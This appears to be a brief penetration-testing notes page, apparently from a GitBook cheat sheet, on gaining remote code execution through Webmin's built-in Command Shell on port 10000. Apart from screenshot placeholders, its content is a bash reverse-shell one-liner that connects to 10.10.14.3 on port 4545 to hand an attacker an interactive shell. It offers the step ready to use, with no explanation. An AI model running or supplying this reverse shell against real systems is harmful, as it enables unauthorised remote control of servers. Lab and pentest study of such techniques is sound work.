# (10000) Webmin

<details>

<summary>Obtain RCE on Webmin</summary>

In Dashboard --> Others --> Command Shell

<figure><img src="../.gitbook/assets/image (341).png" alt=""><figcaption></figcaption></figure>

Put in bash reverse shell

```bash
/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.3/4545 0>&1'
```

<figure><img src="../.gitbook/assets/image (342).png" alt=""><figcaption></figcaption></figure>

</details>
